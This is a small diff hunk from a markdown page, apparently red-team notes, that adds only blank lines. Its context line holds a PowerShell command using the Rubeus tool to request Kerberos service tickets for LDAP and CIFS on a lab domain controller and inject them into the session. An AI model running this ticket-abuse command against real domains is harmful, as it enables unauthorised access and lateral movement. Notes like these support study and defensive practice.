@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:25:48.068156+00:00'
 ```powershell
 .\Rubeus.exe asktgs /ticket:<ticket base64> /service:LDAP/dc.lab.local,cifs/dc.lab.local /ptt
 ```
+
+
